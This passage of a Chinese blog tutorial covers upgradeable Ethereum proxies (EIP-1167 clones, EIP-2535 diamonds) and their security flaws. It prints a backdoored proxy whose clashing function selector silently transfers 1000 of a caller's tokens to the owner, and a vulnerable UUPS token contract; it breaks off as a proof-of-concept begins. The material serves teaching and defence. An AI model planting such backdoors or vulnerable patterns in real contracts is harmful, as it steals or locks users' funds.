0x3d602d80600a3d3981f3363d3d373d3d3d363d73)<br>            mstore(add(ptr, 0x58), salt)<br>            mstore(add(ptr, 0x78), keccak256(add(ptr, 0x0c), 0x37))<br>            predicted := keccak256(add(ptr, 0x43), 0x55)<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Computes the address of a clone deployed using &#123;Clones-cloneDeterministic&#125;.<br>     */<br>    // 计算使用 &#123;Clones-cloneDeterministic&#125; 部署的克隆的地址。<br>    function predictDeterministicAddress(address implementation, bytes32 salt)<br>        internal<br>        view<br>        returns (address predicted)<br>    &#123;<br>        return predictDeterministicAddress(implementation, salt, address(this));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>虽然通过<code>delegatecall</code>的方式将外部对代理合约的调用全部转接到远程合约上，省去了部署一次合约的开销，但是它存在以下问题：</p><ul><li>代理合约只拷贝了远程合约的runtime code，由于涉及初始化部分的代码在init code中，故代理合约无法拷贝远程合约的构造函数内的内容，需要一个额外的initialize 函数来初始化代理合约的状态值。</li><li><code>delegatecall</code>只能调用public 或者 external的方法，对于其internal 和 private 方法无法调用。所以代理合约相当于只拷贝了远程合约的公开的方法。</li></ul><p>您可能听说过<a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">parity multisig wallet hack</a>。有多个代理（不是 EIP1167）引用相同的实现。但是，钱包具有自毁功能，可以清空合约的存储空间和代码。不幸的是，Parity 钱包的访问控制存在一个错误，有人意外获得了原始实现的所有权。那并没有直接从其他平价钱包中窃取资产，但随后黑客删除了原始实现，使所有剩余的钱包成为没有功能的外壳，并将资产永久锁定在其中。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>我们需要以下合约:</p><ul><li>实现：这是我们的逻辑所在的地方，我们将其称为Implementation.sol。</li><li>CloneFactory：这将是我们的工厂，我们将有一个clone() 函数，用户将触发该函数，工厂将输出代理的地址。工厂的名称将是CloneFactory.sol。</li><li>代理：与代理无关，代理将是CloneFactory.sol 中的clone() 函数的输出。可以有尽可能多的不同代理，这就是整个目的，以创建许多Implementation.sol的克隆。</li></ul><p>逻辑合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &gt;= 0.8.0 &lt; 0.9.0;<br><br>contract Implementation &#123;<br>    uint public x;<br>    bool public isBase;<br>    address public owner;<br><br>    modifier onlyOwner() &#123;<br>        require(msg.sender == owner,&quot;ERROR: Only Owner&quot;);<br><br>        _;<br>    &#125;<br><br>    // 逻辑合约的构造函数应该是无参的<br>    constructor() &#123;<br>        isBase = true;<br>    &#125;<br><br>    // 一旦创建代理克隆，需要立即调用 initialize 函数<br>    function initialize(address _owner) external &#123;<br>        // 保证该合约只用于逻辑，不会被初始化（代理或者克隆合约不知道构造函数）<br>        require(isBase == false,&quot;ERROR: This the base contract, cannot initialize&quot;);<br>        // 确保 initialize 函数只被调用一次<br>        require(owner == address(0),&quot;ERROR: Contract already initialized&quot;);<br>        owner = _owner;<br>    &#125;<br><br>    function setX(uint _newX) external onlyOwner &#123;<br>        x = _newX;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CloneFactory</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &gt;= 0.8.0 &lt; 0.9.0;<br><br>interface Implementation &#123;<br>    function initialize(address _owner) external;<br>&#125;<br><br>contract CloneFactory &#123;<br>    // 逻辑合约的地址<br>    address public implementation;<br>    // 跟踪所有已部署克隆的映射<br>    mapping(address =&gt; address[]) public allClones;<br>    event NewClone(address _newClone, address _owner);<br><br>    constructor(address _imlementation) &#123;<br>        implementation = _imlementation;<br>    &#125;<br><br>    // 来自 Open Zeppelin，用于动态创建代理合约并返回新合约的地址<br>    function clone(address _imlementation) internal returns (address instance) &#123;<br>        assembly &#123;<br>            let ptr := mload(0x40)<br>            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)//32 bytes<br>            mstore(add(ptr, 0x14), shl(0x60, _imlementation)) //20bytes<br>            mstore(add(ptr, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)//32 bytes<br>            instance := create(0, ptr, 0x37)<br>        &#125;<br>        require(instance != address(0),&quot;ERC1167: create failed&quot;);<br>    &#125;<br><br>    // 这是用户需要调用的函数<br>    function _clone() external &#123;<br>        address identicalChild = clone(implementation);<br>        allClones[msg.sender].push(identicalChild);<br>        // 这将使 _clone() 函数的调用者成为克隆合约的所有者。<br>        Implementation(identicalChild).initialize(msg.sender);<br>        emit NewClone(identicalChild,msg.sender);<br>    &#125;<br><br>    function returnClones(address _owner) external view returns (address[] memory) &#123;<br>        return allClones[_owner];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="EIP2535"><a href="#EIP2535" class="headerlink" title="EIP2535"></a>EIP2535</h3><h4 id="钻石协议"><a href="#钻石协议" class="headerlink" title="钻石协议"></a>钻石协议</h4><p>EIP-2535 取代了 <a href="https://ethereum-blockchain-developer.com/110-upgrade-smart-contracts/10-eip-1538-transparent-contract-standard/">EIP-1538</a></p><p><a href="https://eips.ethereum.org/EIPS/eip-2535">EIP-2535官方文档</a></p><p><a href="https://soliditydeveloper.com/eip-2535">EIP-2535：组织和升级模块化智能合约系统的标准</a></p><p><a href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石简介</a></p><p><a href="https://www.quicknode.com/guides/smart-contract-development/the-diamond-standard-eip-2535-explained-part-1">实现指南</a></p><p><a href="https://github.com/mudgen/diamond">参考实现</a></p><p>使用普通的代理模式，我们可以有效地升级智能合约，但它有一些限制。</p><ul><li>如果您只想升级复杂合约的一小部分怎么办？你仍然需要升级到一个全新的逻辑合约。这使得更难看出实际发生了什么变化。</li><li>多个代理可以重用逻辑合约，但不是很实用。您只能使用一个逻辑合约创建相同的代理实例。无法组合逻辑合约或仅使用其中的一部分。</li><li>您不能拥有模块化的权限系统，例如允许某些实体仅升级现有功能的子集。相反，这是一种全有或全无的方法。</li><li>在升级后访问逻辑合约中的数据时必须特别小心，因为代理合约中的数据永远不会随着升级而改变。这意味着如果您要停止在逻辑合约中使用状态变量，您仍然需要将其保留在变量定义中。当您添加状态变量时，您只能将它们附加到定义的末尾。</li><li>逻辑合约可以轻松达到 24kb 的最大合约大小限制。</li></ul><p>Diamond 标准是最终确定的以太坊改进提案 ( <a href="https://eips.ethereum.org/EIPS/eip-2535">EIP-2535</a> )，旨在使开发人员更容易模块化和升级他们的智能合约。Diamond 标准的核心思想类似于可升级的智能合约，例如代理模式，但好处是您可以从单个 Diamond 合约（即代理合约）控制许多实施合约（即逻辑合约）。钻石标准的一些主要特点包括：</p><ul><li>对n个实现合约进行代理调用的单个网关</li><li>以原子方式升级单个或多个智能合约</li><li>您可以添加到 Diamond 的实施合同数量没有存储限制</li><li>在 Diamond 上进行的所有升级的日志历史记录</li><li>可以降低gas成本（即通过减少外部函数调用的次数）</li></ul><p>Diamond 合约的三个核心组件包括 DiamondCut、DiamondStorage 以及标准函数和事件，它们允许您查看 Diamond 中的内容以及升级时间。一些已实施 Diamond 标准的协议包括<a href="https://www.aavegotchi.com/">Aavegotchi</a>、<a href="https://barnbridge.com/">BarnBridge</a>、<a href="https://derivadex.com/">DerivaDEX</a>和<a href="https://oncyber.io/">Oncyber</a>。</p><p>此外，还有不同类型的钻石，例如：</p><ul><li><strong>可升级钻石</strong>：可以升级的可变合约</li><li><strong>Finished Diamond</strong> : 由于可升级功能被删除，因此不可变合约</li><li><strong>单切钻石</strong>：不可再升级的不可变合约</li></ul><h4 id="DiamondCut：管理界面"><a href="#DiamondCut：管理界面" class="headerlink" title="DiamondCut：管理界面"></a>DiamondCut：管理界面</h4><p>钻石存储必须实现该<code>diamondCut</code>功能。使用此功能，您可以（取消）注册特定逻辑合约的功能。注册函数后，菱形存储可以识别其回退函数中任何调用的函数选择器，检索正确的构面地址，然后为其运行委托调用。</p><p>函数选择器冲突是可能的，这意味着两个不同的函数会产生相同的 4 字节函数签名。这很容易通过一个简单的检查来防止，该检查防止添加已经存在的功能选择器。钻石参考实现在升级时执行此检查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IDiamondCut &#123;<br>    enum FacetCutAction &#123;Add, Replace, Remove&#125;<br><br>    struct FacetCut &#123;<br>        address facetAddress;<br>        FacetCutAction action;<br>        bytes4[] functionSelectors;<br>    &#125;<br><br>    function diamondCut(<br>        FacetCut[] calldata _diamondCut,<br>        address _init,<br>        bytes calldata _calldata<br>    ) external;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="DiamondStorage：数据保管者"><a href="#DiamondStorage：数据保管者" class="headerlink" title="DiamondStorage：数据保管者"></a>DiamondStorage：数据保管者</h4><p>为了避免任何存储槽冲突，我们可以使用一个简单的技巧来存储数据。虽然通常 Solidity 会将数据存储在由状态变量定义的后续槽中，但我们也可以使用程序集显式设置存储槽。</p><p>这样做时，我们只需要确保存储槽位于一个不会与其他方面产生冲突的唯一位置。通过散列构面名称可以轻松实现这一点。</p><p>现在每当我们想读或写<code>FacetData</code>时，我们不必担心覆盖其他方面的数据，因为我们的存储槽位置是唯一的。当然，您也可以从任何其他方面访问这些数据，您只需要继承<code>FacetA</code>并使用该<code>facetData</code>功能。这就是为什么它对创建可重用的构面特别有帮助。</p><p>然而，另一种设计是<a href="https://dev.to/mudgen/appstorage-pattern-for-state-variables-in-solidity-3lki">AppStorage 模式</a>，我们不会在这里详细介绍，但它牺牲了可重用性以略微提高代码可读性。AppStorage 在特定于项目的方面之间共享状态变量时非常有用，并且不会在菱形中用于其他项目或协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract FacetA &#123;<br>  struct FacetData &#123;<br>    address owner;<br>    bytes32 dataA;<br>  &#125;<br><br>  function facetData()<br>    internal<br>    pure<br>    returns(FacetData storage facetData) &#123;<br>    bytes32 storagePosition = keccak256(&quot;diamond.storage.FacetA&quot;);<br>    assembly &#123;facetData.slot := storagePosition&#125;<br>  &#125;<br><br>  function setDataA(bytes32 _dataA) external &#123;<br>    FacetData storage facetData = facetData();<br>    require(facetData.owner == msg.sender, &quot;Must be owner.&quot;);<br>    facetData.dataA = _dataA;<br>  &#125;<br><br>  function getDataA() external view returns (bytes32) &#123;<br>    return facetData().dataA;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="DiamondLoupe：找出支持的功能"><a href="#DiamondLoupe：找出支持的功能" class="headerlink" title="DiamondLoupe：找出支持的功能"></a>DiamondLoupe：找出支持的功能</h4><p>DiamondLoupe 帮助我们了解 Diamond 合约中的 Facets、函数选择器和 facet 地址所指向的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IDiamondLoupe &#123;<br>  struct Facet &#123;<br>    address facetAddress;<br>    bytes4[] functionSelectors;<br>  &#125;<br><br>  function facets() external view returns (Facet[] memory facets_);<br>  function facetFunctionSelectors(address _facet) external view returns (bytes4[] memory facetFunctionSelectors_);<br>  function facetAddresses() external view returns (address[] memory facetAddresses_);<br>  function facetAddress(bytes4 _functionSelector) external view returns (address facetAddress_);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>目前没有通过 Openzeppelin 合约提供的参考实现，但它<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2793">可能</a>很快就会发生。EIP 作者<a href="http://www.perfectabstractions.com/">Nick Mudge</a>创建了<a href="https://github.com/mudgen/diamond">三个</a><a href="https://eip2535diamonds.substack.com/p/smart-contract-security-audits-for">经过审计</a> 的参考实现：</p><ul><li><a href="https://github.com/mudgen/diamond-1-hardhat">diamond-1-hardhat</a>（简单实现）</li><li><a href="https://github.com/mudgen/diamond-2-hardhat">diamond-2-hardhat</a>（气体优化）</li><li><a href="https://github.com/mudgen/diamond-3-hardhat">diamond-3-hard</a>（简单放大镜功能）</li></ul><p>你应该选择哪一个？他们都做同样的事情，所以这并不重要。如果您计划进行多次升级并关心汽油成本，请考虑使用 diamond-2。它包含一些复杂的按位运算来减少存储空间，每添加 20 个函数将为您节省大约 80,000 个 gas。否则， diamond-1 可能是更好的选择，因为代码更具可读性。</p><h2 id="检测是否是代理"><a href="#检测是否是代理" class="headerlink" title="检测是否是代理"></a>检测是否是代理</h2><p>在许多情况下，EtherScan 可以检测合约是否被代理：</p><p><a href="https://medium.com/etherscan-blog/and-finally-proxy-contract-support-on-etherscan-693e3da0714b">https://medium.com/etherscan-blog/and-finally-proxy-contract-support-on-etherscan-693e3da0714b</a></p><p><a href="https://etherscan.io/proxyContractChecker">https://etherscan.io/proxyContractChecker</a></p><p>在 EtherScan 上查看合约时，在“合约”选项卡下，如果 Etherscan 知道合约被代理，那么您将不仅有“读取合约”和“写入合约”，还有“通过代理读取合约”和“写入合约”通过代理”或类似的。</p><p>如果代理代码已更新，Etherscan 将向您显示代码的先前版本的合约地址，以便用户可以检查所有版本的更改。</p><h2 id="函数冲突"><a href="#函数冲突" class="headerlink" title="函数冲突"></a>函数冲突</h2><p><a href="https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070">当心代理：学习如何利用函数冲突</a></p><p><a href="https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357">函数冲突解释</a></p><p><a href="https://github.com/tinchoabbate/function-clashing-poc">复现</a></p><p><a href="https://ropsten.etherscan.io/address/0xb97dd0102bb67f81d25d686c661d7f0aed62e344#code">测试</a> 和 <a href="https://gist.github.com/ripwu/d1c99c3de2215bbcb2a51c2f6fda8ca9">题解</a></p><h3 id="函数选择器"><a href="#函数选择器" class="headerlink" title="函数选择器"></a>函数选择器</h3><p>[在以太坊虚拟机中] 每个函数都由其 Keccak-256 哈希的前 4 个字节标识。通过将函数的名称和它接受的参数放入 keccak256 哈希函数中，我们可以推断出它的函数标识符。</p><p>solidity 计算函数选择器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">abi.encodeWithSignature(&quot;store(uint256)&quot;,10)<br></code></pre></td></tr></table></figure><p>ethers.js 计算函数选择器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ethers = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethers&#x27;</span>)<br><br><span class="hljs-comment">//函数功能: 计算函数选择器</span><br><span class="hljs-comment">//input: funcHead 是函数头部申明，去掉&quot;&quot;funcion&quot;关键字，去掉参数名字，只</span><br><span class="hljs-comment">//          保留函数名+参数类型，去掉所有的空格</span><br><span class="hljs-comment">//return: 返回4个字节的字符串</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFunctionSeletor</span>(<span class="hljs-params">funcHead</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> ethers.utils.id(funcHead).slice(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMain</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-comment">//1)计算函数选择器</span><br><span class="hljs-comment">//原函数：function allowance(address owner, address spender)</span><br><span class="hljs-comment">//精简化: allowance(address,address)</span><br>strfunc = <span class="hljs-string">&#x27;allowance(address,address)&#x27;</span><br>funcSeletor = getFunctionSeletor(strfunc)<br>res = strfunc + <span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-built_in">console</span>.log(res,funcSeletor)<br>&#125;<br></code></pre></td></tr></table></figure><p>ethers.js 计算事件选择器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ethers = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethers&#x27;</span>)<br><br><span class="hljs-comment">//函数功能: 计算事件选择器</span><br><span class="hljs-comment">//input: eventHead 是事件头部申明，去掉&quot;&quot;event&quot;关键字，去掉参数名字，只</span><br><span class="hljs-comment">//          保留事件名+参数类型，去掉所有的空格</span><br><span class="hljs-comment">//return: 返回32个字节的字符串</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getEventSelector</span>(<span class="hljs-params">eventHead</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> ethers.utils.id(eventHead)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMain</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-comment">//2) 计算事件选择器</span><br>    <span class="hljs-comment">//原事件: event Approval(address owner, address spender, uint256 value)</span><br>    <span class="hljs-comment">//精简化: Approval(address,address,uint256)</span><br>    strEvent = <span class="hljs-string">&#x27;Approval(address,address,uint256)&#x27;</span><br>    eventSelector = getEventSelector(strEvent)<br>    res2 = strEvent + <span class="hljs-string">&#x27;=&#x27;</span><br>    <span class="hljs-built_in">console</span>.log(res2,eventSelector)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h3><p>这里是一个有问题的代理合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.5.0;<br><br>contract Proxy &#123;<br>    <br>    address public proxyOwner;<br>    address public implementation;<br><br>    constructor(address implementation) public &#123;<br>        proxyOwner = msg.sender;<br>        _setImplementation(implementation);<br>    &#125;<br><br>    modifier onlyProxyOwner() &#123;<br>        require(msg.sender == proxyOwner);<br>        _;<br>    &#125;<br><br>    function upgrade(address implementation) external onlyProxyOwner &#123;<br>        _setImplementation(implementation);<br>    &#125;<br><br>    function _setImplementation(address imp) private &#123;<br>        implementation = imp;<br>    &#125;<br><br>    function () payable external &#123;<br>        address impl = implementation;<br><br>        assembly &#123;<br>            calldatacopy(0, 0, calldatasize)<br>            let result := delegatecall(gas, impl, 0, calldatasize, 0, 0)<br>            returndatacopy(0, 0, returndatasize)<br><br>            switch result<br>            case 0 &#123; revert(0, returndatasize) &#125;<br>            default &#123; return(0, returndatasize) &#125;<br>        &#125;<br>    &#125;<br>    <br>    // This is the function we&#x27;re adding now<br>    function collate_propagate_storage(bytes16) external &#123;<br>        implementation.delegatecall(abi.encodeWithSignature(<br>            &quot;transfer(address,uint256)&quot;, proxyOwner, 1000<br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 collate_propagate_storage(bytes16) 和 burn(uint256) 的函数选择器完全相同，都为 0x42966c68</p><p>由于 burn 调用是通过代理完成的，<strong>因此 EVM 将首先检查代理代码中是否有标识符与 0x42966c68 匹配的函数</strong>。 如果没有，则将执行代理的回退函数并将调用委托给存储在实现中的地址。</p><p>但是，在这种情况下，代理确实包含一个标识符与<code>0x42966c68</code>:匹配的函数<code>collate_propagate_storage(bytes16)</code>。结果，它被执行了。</p><p>让我们记住它的样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function collate_propagate_storage(bytes16) external &#123;<br>   implementation.delegatecall(abi.encodeWithSignature(<br>       &quot;transfer(address,uint256)&quot;, proxyOwner, 1000<br>   ));<br>&#125;<br></code></pre></td></tr></table></figure><p>所以<strong>该函数实际上会强制调用者将</strong> <code>transfer</code> <strong>1000 个令牌交给代理的所有者！</strong>.</p><p><img src="/2022/11/13/upgradeable/473b432f25d2060d65f16d75435d1aa7dce2a058.png" alt="图片"></p><p>用户只想烧掉一个代币，结果却少了 1000 个代币。</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li><a href="https://github.com/trailofbits/slither">Slither</a> 有一个非常好的<a href="https://github.com/trailofbits/slither/wiki/Upgradeability-Checks">插件</a>，它可以立即检测两个合约（代理和实现）之间的功能冲突。</li><li>此漏洞现在已经不会发生，因为<a href="https://blog.openzeppelin.com/the-state-of-smart-contract-upgrades/#transparent-proxies">透明代理模式</a>解决了这个问题</li></ul><h2 id="未初始化"><a href="#未初始化" class="headerlink" title="未初始化"></a>未初始化</h2><p>逻辑合约未初始化，且含有 selfdestruct 函数</p><p>也就是一种拒绝服务 (DOS) 攻击</p><p><a href="https://sissice.github.io/2022/10/03/ParadigmCTF2021three/">Paradigm CTF 2021 - vault</a></p><p><a href="https://www.anquanke.com/post/id/275550#h3-7">Wormhole的实际漏洞情况</a></p><h3 id="UUPS中的漏洞分析"><a href="#UUPS中的漏洞分析" class="headerlink" title="UUPS中的漏洞分析"></a>UUPS中的漏洞分析</h3><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-5vp3-v4hc-gx76">官方公告</a></p><p><a href="https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680">UUPSUpgradeable 漏洞事后分析</a></p><p>该漏洞存在于升级函数中的 DELEGATECALL 指令中，由 UUPSUpgradeable 基础合约暴露。<a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#potentially-unsafe-operations">如此处</a>所述<a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#potentially-unsafe-operations"> 83</a>, a<code>DELEGATECALL</code>可以被攻击者利用，方法是让实施合约调用另一个<code>SELFDESTRUCT</code>本身为 s 的合约，导致调用者被销毁。</p><p>给定一个 UUPS 实现合约，攻击者可以<a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers">初始化它 88</a>并指定自己为升级管理员。这允许他们调用<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-upgradeToAndCall-address-bytes-"><code>upgradeToAndCall</code> 42</a>直接在实现上运行，而不是在代理上运行，并将其用于<code>DELEGATECALL</code>带有<code>SELFDESTRUCT</code>操作的恶意合约。</p><p>如果攻击成功，则此实现支持的任何代理合约都将无法使用，因为对它们的任何调用都会委托给一个没有可执行代码的地址。此外，由于升级逻辑驻留在实现中而不是代理中，因此不可能将代理升级到有效的实现。这有效地破坏了合约，并阻碍了对其持有的任何资产的访问。</p><p><a href="https://github.com/yehjxraymond/exploding-kitten">漏洞利用的工作概念证明</a></p><p><strong>问题合约</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.2;<br><br>import &quot;@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;<br><br>contract SimpleToken is Initializable, ERC20Upgradeable, OwnableUpgradeable, UUPSUpgradeable &#123;<br>    /// @custom:oz-upgrades-unsafe-allow constructor<br>    // constructor() initializer &#123;&#125;<br>   //这里不应该出现constructor 的初始化，但是initializer事实上只是进行了一个判断，即该函数的调用过程是否在初始化过程中involve了，它并没有进行状态的改变。<br><br>    function initialize() initializer public &#123;<br>        __ERC20_init(&quot;testToken&quot;, &quot;MTK&quot;);<br>        __Ownable_init();<br>        __UUPSUpgradeable_init();<br>    &#125;<br><br>    function mint(address to, uint256 amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    function _authorizeUpgrade(address newImplementation)<br>        internal<br>        onlyOwner<br>        override<br>    &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>POC</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 